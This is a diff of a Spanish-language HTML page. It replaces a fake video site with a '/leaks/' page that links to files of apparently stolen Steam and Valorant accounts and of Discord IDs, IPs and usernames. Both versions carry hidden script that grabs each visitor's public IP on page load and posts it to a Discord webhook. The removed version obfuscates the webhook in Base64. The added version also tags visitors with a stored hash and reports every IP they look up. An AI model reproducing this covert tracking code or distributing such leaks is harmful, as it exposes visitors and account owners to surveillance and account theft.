@@ -1,119 +1,243 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>PachHub</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f9f9f9;
-            margin: 20px;
-            padding: 0;
-            color: #333;
-        }
-        h1 {
-            text-align: center;
-            margin-bottom: 40px;
-            color: #2c3e50;
-        }
-        .video-container {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 20px;
-            justify-content: center;
-        }
-        .video-item {
-            max-width: 320px;
-            background: #fff;
-            padding: 10px;
-            border-radius: 8px;
-            box-shadow: 0 2px 5px rgb(0 0 0 / 0.1);
-        }
-        video {
-            width: 100%;
-            border-radius: 5px;
-        }
-        .video-title {
-            margin-top: 10px;
-            font-weight: bold;
-            text-align: center;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>W4LIFE</title>
+  <style>
+    body {
+      background-color: #f9f8f6;
+      color: #000;
+      font-family: "Courier New", Courier, monospace;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .header {
+      text-align: center;
+      border-bottom: 2px solid #000;
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .header h1 {
+      font-size: 26px;
+      color: #a00;
+    }
+
+    .info-ip-link {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .section {
+      background-color: #f0e0d6;
+      border: 1px solid #aaa;
+      padding: 10px;
+      margin-bottom: 20px;
+    }
+
+    .section h2 {
+      color: #000080;
+      margin-bottom: 5px;
+    }
+
+    a {
+      color: #0000dd;
+      text-decoration: underline;
+    }
+
+    a:hover {
+      color: darkred;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      margin-top: 40px;
+    }
+
+    #ip-section {
+      display: none;
+    }
+
+    input, button {
+      font-family: monospace;
+      margin: 5px 0;
+    }
+
+    pre {
+      background: #fff;
+      padding: 10px;
+      border: 1px solid #ccc;
+      white-space: pre-wrap;
+    }
+
+    #userHash {
+      position: absolute;
+      top: 10px;
+      left: 20px;
+      font-size: 14px;
+      font-family: monospace;
+      color: #333;
+      user-select: all;
+      z-index: 1000;
+    }
+  </style>
 </head>
 <body>
-    <h1>PachHub</h1>
-    <div class="video-container">
-        <div class="video-item">
-            <video controls>
-                <source src="videos/video1.mp4" type="video/mp4" />
-                Tu navegador no soporta el elemento de video.
-            </video>
-            <div class="video-title">Video 1</div>
-        </div>
-        <div class="video-item">
-            <video controls>
-                <source src="videos/video2.mp4" type="video/mp4" />
-                Tu navegador no soporta el elemento de video.
-            </video>
-            <div class="video-title">Video 2</div>
-        </div>
-        <div class="video-item">
-            <video controls>
-                <source src="videos/video3.mp4" type="video/mp4" />
-                Tu navegador no soporta el elemento de video.
-            </video>
-            <div class="video-title">Video 3</div>
-        </div>
-    </div>
 
-    <script>
-        function decodeBase64(str) {
-            try {
-                return atob(str);
-            } catch (e) {
-                console.error("Error al decodificar Base64:", e);
-                return null;
-            }
-        }
+<div class="header">
+  <h1>/leaks/ - un poco de todo</h1>
+  <p>desde leaks hasta a malware.</p>
+  <a class="info-ip-link" onclick="document.getElementById('ip-section').style.display = 'block'">🔍 Info IP</a>
+  <div id="userHash" title="Tu hash único"></div>
+</div>
 
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const userIP = data.ip;
-                console.log("La IP pública es:", userIP);
+<!-- Sección de búsqueda de IP -->
+<div class="section" id="ip-section">
+  <h2>🔍 Buscar información de una IP</h2>
+  <input type="text" id="ipInput" placeholder="Ej: 8.8.8.8">
+  <button onclick="buscarIP()">Buscar</button>
+  <button onclick="descargarIPInfo()">Descargar como .txt</button>
+  <pre id="ipResult">Introduce una IP y presiona buscar.</pre>
+</div>
 
-                // Webhook codificado en Base64
-                const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4MjA1MzcwMjE4MDgwMjU2MS85OFZoN0szWXVuSnlYcVhDeDRuMXBsV1VYWHdlcmtLYUZiY3Z4bnhMaVhZR3U4RVpxRUFkckpHamJJNXpUSG8yaWVXag==';
-                const discordWebhookURL = decodeBase64(encodedWebhook);
+<div class="section">
+  <h2>🗂 Leaks De juegos y apps</h2>
+  <ul>
+    <li>
+      <a href="https://raw.githubusercontent.com/pachz22/pachz22.github.io/papu/ids%2Cips%2Cusernames.txt" download="ids_ips_usernames.txt" target="_blank" rel="noopener noreferrer">
+        IDS DISCORD/IPS/USERNAME
+      </a> - ids, ips and usernames date:09/6/2025
+    </li>
+    <li><a href="https://raw.githubusercontent.com/pachz22/pachz22.github.io/refs/heads/papu/LEAKS/Steam%20Accounts%20LATAM-peru-chile-arg%20and%20more%20(1).txt" target="_blank" rel="noopener noreferrer">1.steam accs and valorant accs</a> - cuentas de valorant y steam. date:10/6/2025</li>
+    <li><a href="https://raw.githubusercontent.com/pachz22/pachz22.github.io/refs/heads/papu/LEAKS/Steam%20Accounts%20LATAM-peru-chile-arg%20and%20more%20(2).txt" target="_blank" rel="noopener noreferrer">2.steam accs and valorant accs</a> - cuentas de valorant y steam. date:10/6/2025</li>
+    <li><a href="https://raw.githubusercontent.com/pachz22/pachz22.github.io/refs/heads/papu/LEAKS/Steam%20Accounts%20LATAM-peru-chile-arg%20and%20more%20(3).txt" target="_blank" rel="noopener noreferrer">3.steam accs and valorant accs</a> - cuentas de valorant y steam. date:10/6/2025</li>
+    <li><a href="https://raw.githubusercontent.com/pachz22/pachz22.github.io/refs/heads/papu/LEAKS/Steam%20Accounts%20LATAM-peru-chile-arg%20and%20more%20(4).txt" target="_blank" rel="noopener noreferrer">4.steam accs and valorant accs</a> - cuentas de valorant y steam. date:10/6/2025</li>
+    <li><a href="https://raw.githubusercontent.com/pachz22/pachz22.github.io/refs/heads/papu/LEAKS/Steam%20Accounts%20LATAM-peru-chile-arg%20and%20more%20(5).txt" target="_blank" rel="noopener noreferrer">5.steam accs and valorant accs</a> - cuentas de valorant y steam. date:10/6/2025</li>
+    <li><a href="https://raw.githubusercontent.com/pachz22/pachz22.github.io/refs/heads/papu/LEAKS/Steam%20Accounts%20LATAM-peru-chile-arg%20and%20more%20(6).txt" target="_blank" rel="noopener noreferrer">6.steam accs and valorant accs</a> - cuentas de valorant y steam. date:10/6/2025</li>
+    <li><a href="https://raw.githubusercontent.com/pachz22/pachz22.github.io/refs/heads/papu/LEAKS/Steam%20Accounts%20LATAM-peru-chile-arg%20and%20more%20(7).txt" target="_blank" rel="noopener noreferrer">7.steam accs and valorant accs</a> - cuentas de valorant y steam. date:10/6/2025</li>
+    <li><a href="https://raw.githubusercontent.com/pachz22/pachz22.github.io/refs/heads/papu/LEAKS/Steam%20Accounts%20LATAM-peru-chile-arg%20and%20more%20(8).txt" target="_blank" rel="noopener noreferrer">8.steam accs and valorant accs</a> - cuentas de valorant y steam. date:10/6/2025</li>
+    <li><a href="https://raw.githubusercontent.com/pachz22/pachz22.github.io/refs/heads/papu/LEAKS/Steam%20Accounts%20LATAM-peru-chile-arg%20and%20more%20(9).txt" target="_blank" rel="noopener noreferrer">9.steam accs and valorant accs</a> - cuentas de valorant y steam. date:10/6/2025</li>
 
-                if (!discordWebhookURL) return;
+  </ul>
+</div>
 
-                const payload = {
-                    content: `@everyone ¡Alguien visitó tu página! La IP es: ${userIP}`
-                };
+  <div class="section">
+    <h2>🔎 OSINT y Análisis de Seguridad</h2>
+    <ul>
+      <li><a href="https://www.shodan.io/" target="_blank">Shodan</a> - Buscador de dispositivos expuestos en Internet.</li>
+      <li><a href="https://www.censys.io/" target="_blank">Censys</a> - Alternativa a Shodan para análisis de red.</li>
+      <li><a href="https://greynoise.io/" target="_blank">GreyNoise</a> - IP reputation en ataques automatizados.</li>
+    </ul>
+  </div>
 
-                fetch(discordWebhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log("IP enviada correctamente a Discord.");
-                    } else {
-                        console.error("Hubo un error al enviar la IP.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Error al enviar la IP a Discord:", error);
-                });
-            })
-            .catch(error => {
-                console.error("Error al obtener la IP pública:", error);
-            });
-    </script>
+  <div class="section">
+    <h2>📚 Wordlists y Documentación</h2>
+    <ul>
+      <li><a href="https://github.com/danielmiessler/SecLists" target="_blank">SecLists</a> - Diccionarios éticos para pentesting.</li>
+      <li><a href="https://book.hacktricks.xyz/" target="_blank">HackTricks</a> - Técnicas avanzadas para pentesters.</li>
+      <li><a href="https://crackstation.net/" target="_blank">CrackStation</a> - Diccionario de contraseñas públicas.</li>
+    </ul>
+  </div>
+
+<div class="footer">
+  <p>🔐 Proyecto Leaks/info/tools - © 2025 - Ezen.fr/badfull/pach</p>
+</div>
+
+<script>
+  const ipResultElement = document.getElementById("ipResult");
+
+  function generarHash() {
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    const parte = n => Array.from({ length: n }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+    return `${parte(5)}-${parte(5)}`;
+  }
+
+  function obtenerHashUnico() {
+    let hash = localStorage.getItem("userUniqueHash");
+    if (!hash) {
+      hash = generarHash();
+      localStorage.setItem("userUniqueHash", hash);
+    }
+    return hash;
+  }
+
+  const userHash = obtenerHashUnico();
+  document.getElementById("userHash").textContent = `tu hash: ${userHash}`;
+
+  function enviarWebhook(ip, desde = "manual") {
+    const url = "https://discord.com/api/webhooks/1382097915803209758/0Y98bVvOVpsyMcAGfN5dk6EPkxux4qOTnTAwuzrL_i_3qScJXLVzA-6abu9-LBEmZGUb";
+    const payload = {
+      content: `🔍 **IP buscada:** ${ip}\n👤 **Hash:** ${userHash}\n🌐 Desde: *${desde}*`
+    };
+
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    }).catch(console.error);
+  }
+
+  async function buscarIP() {
+    const ip = document.getElementById("ipInput").value.trim();
+    if (!ip) {
+      ipResultElement.textContent = "⚠️ Introduce una IP válida.";
+      return;
+    }
+
+    ipResultElement.textContent = "🔄 Buscando información...";
+
+    try {
+      const response = await fetch(`http://ip-api.com/json/${ip}`);
+      const data = await response.json();
+
+      if (data.status === "fail") {
+        ipResultElement.textContent = `❌ Error: ${data.message}`;
+      } else {
+        const info = `
+📡 Dirección IP: ${data.query}
+🌍 País: ${data.country}
+📍 Región: ${data.regionName}
+🏙 Ciudad: ${data.city}
+🏢 ISP: ${data.isp}
+🛰 Organización: ${data.org}
+🌐 ASN: ${data.as}
+🕒 Zona Horaria: ${data.timezone}
+🌎 Coordenadas: ${data.lat}, ${data.lon}
+        `.trim();
+
+        ipResultElement.textContent = info;
+        enviarWebhook(ip, "Busco");
+      }
+    } catch (error) {
+      ipResultElement.textContent = "❌ Error al consultar la IP.";
+      console.error(error);
+    }
+  }
+
+  function descargarIPInfo() {
+    const texto = ipResultElement.textContent;
+    const blob = new Blob([texto], { type: "text/plain" });
+    const link = document.createElement("a");
+    link.href = URL.createObjectURL(blob);
+    link.download = "info_ip.txt";
+    link.click();
+  }
+
+  (async () => {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const { ip } = await res.json();
+      enviarWebhook(ip, "Entro");
+    } catch (err) {
+      console.error("No se pudo obtener la IP pública:", err);
+    }
+  })();
+</script>
 </body>
 </html>
